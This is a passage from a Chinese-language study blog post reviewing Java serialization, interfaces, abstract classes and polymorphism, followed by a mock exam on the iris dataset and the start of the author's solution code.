class="keyword">for</span>(<span class="type">int</span> i=flower_cnt-<span class="number">10</span>;i&lt;flower_cnt;i++) &#123;</span><br><span class="line">ser.writeObject(sorted_fower[i]);</span><br><span class="line">&#125;</span><br><span class="line">ser.close();</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 4. end&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>虽说感觉用不上 但是还是写下<br>重点是通过 fileInputStream.available()&gt;0 来判断结束与否</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\序列化.ser&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">deser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">Iris_Flower obj;</span><br><span class="line"><span class="keyword">while</span>(fileInputStream.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">obj = (Iris_Flower)deser.readObject();</span><br><span class="line">System.out.println(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">deser.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>再复习下与面向对象相关的一些知识点</p><h2 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h2><p>extends<br>注意 如果父类构造函数是带参数的 那么子类构造函数必须显示调用super(xxx)<br>所以一般将父类抽象成接口 简化操作</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>implements</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">xxx</span>&#123;</span><br><span class="line">xxx <span class="title function_">xxx</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">xx</span> <span class="keyword">implements</span> <span class="title class_">xxx</span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>除了不能实例化对象以外跟普通的类没有区别<br>一般还是用接口方便点 不需要考虑extends接口类后父类的行为</p><p>总结以下:</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 抽象类不能被实例化</span><br><span class="line"><span class="bullet">2.</span> 抽象类不一定含抽象方法 但含有抽象方法的一定是抽象类</span><br><span class="line"><span class="bullet">3.</span> 抽象类中的抽象方法只是声明 不给出方法体</span><br><span class="line"><span class="bullet">4.</span> 构造方法 类方法(static) 不能声明为抽象方法</span><br><span class="line"><span class="bullet">5.</span> 抽象类的子类必须给出抽象类中抽象方法的具体实现 除非子类也是抽象类</span><br></pre></td></tr></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>给个示例即可</p><h3 id="抽象类实现"><a href="#抽象类实现" class="headerlink" title="抽象类实现"></a>抽象类实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Father</span> <span class="keyword">extends</span> <span class="title class_">Object</span>&#123;</span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] Son1 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] Son2 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son3</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] Son3 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mine</span> &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">Father[] sons = <span class="keyword">new</span> <span class="title class_">Father</span>[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line"><span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> Math.random()*<span class="number">10.0</span>;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">3.0</span>)</span><br><span class="line">sons[i] = <span class="keyword">new</span> <span class="title class_">Son1</span>();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(x&gt;<span class="number">3.0</span>&amp;&amp;x&lt;<span class="number">6.0</span>)</span><br><span class="line">sons[i] = <span class="keyword">new</span> <span class="title class_">Son2</span>();</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">sons[i] = <span class="keyword">new</span> <span class="title class_">Son3</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(Father i: sons) &#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="literal">null</span>)<span class="keyword">continue</span>;</span><br><span class="line">i.Print();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h3><p>注意方法定义为public</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span> <span class="keyword">implements</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] Son1 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span> <span class="keyword">implements</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] Son2 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son3</span> <span class="keyword">implements</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] Son3 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mine</span> &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">Father[] sons = <span class="keyword">new</span> <span class="title class_">Father</span>[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line"><span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> Math.random()*<span class="number">10.0</span>;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">3.0</span>)</span><br><span class="line">sons[i] = <span class="keyword">new</span> <span class="title class_">Son1</span>();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(x&gt;<span class="number">3.0</span>&amp;&amp;x&lt;<span class="number">6.0</span>)</span><br><span class="line">sons[i] = <span class="keyword">new</span> <span class="title class_">Son2</span>();</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">sons[i] = <span class="keyword">new</span> <span class="title class_">Son3</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(Father i: sons) &#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="literal">null</span>)<span class="keyword">continue</span>;</span><br><span class="line">i.Print();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="模拟题"><a href="#模拟题" class="headerlink" title="模拟题"></a>模拟题</h1><p>最后贴一个模拟题的完整代码 写麻了…<br>大致照着这个搞 考试没多大问题 打不了写的麻烦一点罢了…<br>模拟题目:</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">文件iris.csv中每行是一朵鸢尾花的花萼长度、花萼宽度、花瓣长度、花瓣宽度、种类，在IDE中设计一个Java工程（工程名为iris，保存到D盘根目录，包名为sbschoold.姓名拼音，如bsbschool.sbdesu，工程中只包含一个iris.java，2-5题要求在main函数中完成，必须使用try-with-resource操作文件）：</span><br><span class="line"><span class="bullet">1.</span>设计iris类，实例变量包括iris.csv中的所有列，注意选择合适的数据类型。要求所有变量均定义为私有变量，所有对变量的访问必须通过类的公开方法进行。覆盖继承自Object的某一方法，按iris.csv表格中从左至右的顺序print对象的各个属性，输出形如：“[5.1, 3.5, 1.4, 0.2]: setosa”(不包含引号，注意空格)。该方法将作为后续文本输出的默认方式。（15分）</span><br><span class="line"><span class="bullet">2.</span>从iris.csv中逐行读入所有数据，用构造函数初始化iris对象，将其存入一个集合中（可选择合适的数据结构）并记录输入顺序。在输入顺序的第71个位置之前插入一个新的对象：“[6.7, 3.3, 5.7, 2.5]: virginica”。对该集合进行遍历，将集合中的对象数量写入文本文件answer<span class="emphasis">_1.txt中；再按输入顺序，将花萼长度在(6.0,6.9)区间内的对象接着输出至answer_</span>1.txt。所输出的数量单独占一行，每个对象占一行。（20分）</span><br><span class="line"><span class="bullet">3.</span>升级iris类，添加一个方法，使之能够计算两个iris对象之间的欧氏距离（即：将iris.csv表格中每一行的前四列数字视作一个四维向量，两个向量的对应分量相减后得到一个差向量，求该差向量的模长即为欧氏距离）。取一个假想对象“[1, 2, 3, 4]: whatever”，以到这个对象的欧式距离从小到大为排序规则，对集合中所有的对象进行排序，将排序结果输出至文本文件answer<span class="emphasis">_2.txt。每个对象单独占一行。（20分）</span></span><br><span class="line"><span class="emphasis">4.升级iris类，使其支持序列化。按第3题中的排序规则，将最后10个iris对象序列化到文件answer_</span>3.ser（20分）</span><br><span class="line"><span class="bullet">5.</span>将第2题读入的iris.csv中的对象称为训练集；读入test.csv中的对象存入另一个集合，称为测试集（这些对象的种类是“未知”）。对测试集中的每一个对象，请使用第3题中的方法计算训练集中各对象和它之间的欧氏距离，并记录其中和它距离最小的8个。将这8个训练对象中出现次数最多的种类作为测试对象的预测种类并修改其“种类”属性（若这8个中出现数量相同的种类，则以相对距离由小到大排序时先出现的种类优先）。将修改完成之后的各测试集对象按原输入顺序输出至文本文件answer<span class="emphasis">_4.txt。每个对象占一行。（10分）</span></span><br><span class="line"><span class="emphasis">6.对第5问的程序，自定义异常，并自行设计测试案例抛出并捕获该异常（10分）</span></span><br><span class="line"><span class="emphasis">7.为所编写的程序添加规范的注释。（5分）</span></span><br><span class="line"><span class="emphasis">8.提交时请将整个工程打包为“考场号-学号-姓名.zip”，如“01-xxx-22222222.zip”，提交至指定云盘链接。</span></span><br><span class="line"><span class="emphasis"></span></span><br></pre></td></tr></table></figure><p>我的<del>丑陋</del>代码实现:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flower</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">double</span> a,b,c,d;</span><br><span class="line"><span class="keyword">private</span> String e;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Flower</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b,<span class="type">double</span> c,<span class="type">double</span> d,String e)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.a = a;<span class="built_in">this</span>.b = b;<span class="built_in">this</span>.c = c;<span class="built_in">this</span>.d = d;<span class="built_in">this</span>.e = e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ModifyE</span><span class="params">(String e)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.e = e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">geta</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getb</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getc</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getd</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">gete</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">s = <span class="string">&quot;[&quot;</span>+Double.toString(<span class="built_in">this</span>.a)+<span class="string">&quot;,&quot;</span>+Double.toString(<span class="built_in">this</span>.b)+<span class="string">&quot;,&quot;</span>+Double.toString(<span class="built_in">this</span>.c)+<span class="string">&quot;,&quot;</span>+Double.toString(<span class="built_in">this</span>.d);</span><br><span class="line">s = s+<span class="string">&quot;]:&quot;</span>;</span><br><span class="line">s = s + <span class="built_in">this</span>.e;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">dis</span><span class="params">(Flower o)</span> &#123;</span><br><span class="line"><span class="type">double</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="built_in">this</span>.a - o.a;</span><br><span class="line"><span class="type">double</span> <span class="variable">bb</span> <span class="operator">=</span> <span class="built_in">this</span>.b - o.b;</span><br><span class="line"><span class="type">double</span> <span class="variable">cc</span> <span class="operator">=</span> <span class="built_in">this</span>.c - o.c;</span><br><span class="line"><span class="type">double</span> <span class="variable">dd</span> <span class="operator">=</span> <span class="built_in">this</span>.d - o.d;</span><br><span class="line"><span class="keyword">return</span> Math.sqrt(aa*aa+bb*bb+cc*cc+dd*dd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare1</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;Flower&gt;&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Flower o1, Flower o2)</span> &#123;</span><br><span class="line"><span class="type">Flower</span> <span class="variable">cFlower</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Flower</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(o1.dis(cFlower)&gt;o2.dis(cFlower))<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Iris</span> &#123;</span><br><span class="line"><span class="keyword">static</span>Flower compareoFlower;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyCompare2</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;Flower&gt;&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MyCompare2</span><span class="params">(Flower o)</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Flower o1, Flower o2)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(o1.dis(compareoFlower)&gt;o2.dis(compareoFlower)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span 